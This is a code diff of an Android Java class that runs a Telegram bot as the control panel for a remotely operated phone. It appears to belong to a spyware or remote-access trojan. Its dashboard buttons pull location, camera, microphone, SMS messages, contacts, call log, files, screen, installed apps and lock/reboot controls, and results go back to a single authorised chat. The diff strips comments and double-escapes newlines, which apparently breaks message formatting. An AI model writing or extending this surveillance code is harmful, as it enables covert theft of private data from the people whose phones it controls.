@@ -4,7 +4,7 @@ import android.content.Context;
 import android.util.Log;
 
 import com.alzahra.data.CommandExecutor;
-
+import com.alzahra.data.CommandResult;
 import org.telegram.telegrambots.bots.TelegramLongPollingBot;
 import org.telegram.telegrambots.meta.TelegramBotsApi;
 import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
@@ -45,11 +45,8 @@ public class BotManager {
                 isRunning = true;
                 isConnected = true;
                 Log.d(TAG, "Bot started successfully");
-                
-                // إرسال رسالة "عودة الاتصال" إذا كان reconnect
                 sendStatusMessage("🟢 *تم إعادة الاتصال*\nالنظام جاهز للاستقبال");
                 sendDashboard();
-                
             } catch (Exception e) {
                 Log.e(TAG, "Bot start error: " + e.getMessage());
                 isConnected = false;
@@ -81,24 +78,14 @@ public class BotManager {
             @Override
             public void onUpdateReceived(Update update) {
                 if (!isRunning) return;
-                
                 if (update.hasMessage() && update.getMessage().hasText()) {
                     String messageText = update.getMessage().getText();
                     String userChatId = update.getMessage().getChatId().toString();
-                    
-                    // التحقق من الصلاحيات
                     if (!userChatId.equals(chatId)) {
                         sendMessage("⛔ *غير مصرح لك*\nمعرفك: `" + userChatId + "`");
                         return;
                     }
-                    
-                    // تنفيذ الأمر وإرسال التقرير
                     executeCommandWithFeedback(messageText);
-                    
-                } else if (update.hasCallbackQuery()) {
-                    // أزرار Inline (للتطوير المستقبلي)
-                    String data = update.getCallbackQuery().getData();
-                    executeCommandWithFeedback("/" + data);
                 }
             }
         };
@@ -108,51 +95,41 @@ public class BotManager {
         new Thread(() -> {
             long startTime = System.currentTimeMillis();
             String cmd = command.replace("/", "").trim();
-            
-            // إرسال "جاري التنفيذ"
             SendMessage processingMsg = new SendMessage(chatId, "⏳ *جاري تنفيذ:* `" + cmd + "`...");
             processingMsg.setParseMode("Markdown");
-            String messageId = null;
-            
+            org.telegram.telegrambots.meta.api.objects.Message sentMsg = null;
             try {
-                org.telegram.telegrambots.meta.api.objects.Message sentMsg = bot.execute(processingMsg);
-                messageId = sentMsg.getMessageId().toString();
+                sentMsg = bot.execute(processingMsg);
             } catch (Exception e) {
                 Log.e(TAG, "Error sending processing message: " + e.getMessage());
             }
             
-            // التنفيذ الفعلي
             CommandResult result = executor.execute(command);
-            
             long duration = System.currentTimeMillis() - startTime;
-            
-            // إرسال النتيجة
             String statusEmoji = result.success ? "✅" : "❌";
             String statusText = result.success ? "نجاح" : "فشل";
             
             StringBuilder response = new StringBuilder();
-            response.append(statusEmoji).append(" *").append(statusText).append("*\n\n");
-            response.append("📝 *الأمر:* `").append(cmd).append("`\n");
-            response.append("⏱️ *المدة:* ").append(duration).append("ms\n\n");
+            response.append(statusEmoji).append(" *").append(statusText).append("*\\n\\n");
+            response.append("📝 *الأمر:* `").append(cmd).append("`\\n");
+            response.append("⏱️ *المدة:* ").append(duration).append("ms\\n\\n");
             
             if (result.success) {
                 if (result.data != null && !result.data.isEmpty()) {
-                    response.append("📊 *النتيجة:*\n").append(result.data);
+                    response.append("📊 *النتيجة:*\\n").append(result.data);
                 } else {
                     response.append("✅ تم التنفيذ بنجاح");
                 }
             } else {
-                response.append("❌ *خطأ:*\n`").append(result.error).append("`");
+                response.append("❌ *خطأ:*\\n`").append(result.error).append("`");
             }
             
-            // تحديث الرسالة أو إرسال جديدة
-            if (messageId != null) {
-                editMessage(messageId, response.toString());
+            if (sentMsg != null) {
+                editMessage(sentMsg.getMessageId().toString(), response.toString());
             } else {
                 sendMessage(response.toString());
             }
             
-            // إعادة لوحة التحكم بعد الأمر
             if (result.showDashboard) {
                 sendDashboard();
             }
@@ -161,11 +138,10 @@ public class BotManager {
 
     public void sendDashboard() {
         SendMessage message = new SendMessage(chatId, 
-            "🎛️ *لوحة التحكم المتكاملة*\n\n" +
+            "🎛️ *لوحة التحكم المتكاملة*\\n\\n" +
             "اختر أحد الأوامر من الأسفل:");
         message.setParseMode("Markdown");
         
-        // إنشاء لوحة الأزرار
         ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
         keyboard.setResizeKeyboard(true);
         keyboard.setOneTimeKeyboard(false);
@@ -173,42 +149,36 @@ public class BotManager {
         
         List<KeyboardRow> rows = new ArrayList<>();
         
-        // الصف الأول: الموقع والكاميرا
         KeyboardRow row1 = new KeyboardRow();
         row1.add(new KeyboardButton("📍 موقعي"));
         row1.add(new KeyboardButton("📸 كاميرا"));
         row1.add(new KeyboardButton("🎤 ميكروفون"));
         rows.add(row1);
         
-        // الصف الثاني: البيانات
         KeyboardRow row2 = new KeyboardRow();
         row2.add(new KeyboardButton("📱 معلومات الجهاز"));
         row2.add(new KeyboardButton("🔋 البطارية"));
         row2.add(new KeyboardButton("📶 الواي فاي"));
         rows.add(row2);
         
-        // الصف الثالث: جمع البيانات
         KeyboardRow row3 = new KeyboardRow();
         row3.add(new KeyboardButton("💬 الرسائل"));
         row3.add(new KeyboardButton("👥 جهات الاتصال"));
         row3.add(new KeyboardButton("📞 سجل المكالمات"));
         rows.add(row3);
         
-        // الصف الرابع: التطبيقات والملفات
         KeyboardRow row4 = new KeyboardRow();
         row4.add(new KeyboardButton("📦 التطبيقات"));
         row4.add(new KeyboardButton("📁 الملفات"));
         row4.add(new KeyboardButton("📱 الشاشة"));
         rows.add(row4);
         
-        // الصف الخامس: التحكم
         KeyboardRow row5 = new KeyboardRow();
         row5.add(new KeyboardButton("🔒 قفل"));
         row5.add(new KeyboardButton("🔓 فتح"));
         row5.add(new KeyboardButton("🔄 إعادة تشغيل"));
         rows.add(row5);
         
-        // الصف السادس: المساعدة
         KeyboardRow row6 = new KeyboardRow();
         row6.add(new KeyboardButton("❓ مساعدة"));
         row6.add(new KeyboardButton("🔄 تحديث"));
@@ -253,7 +223,6 @@ public class BotManager {
             edit.setParseMode("Markdown");
             bot.execute(edit);
         } catch (Exception e) {
-            // إذا فشل التعديل، أرسل رسالة جديدة
             sendMessage(newText);
         }
     }
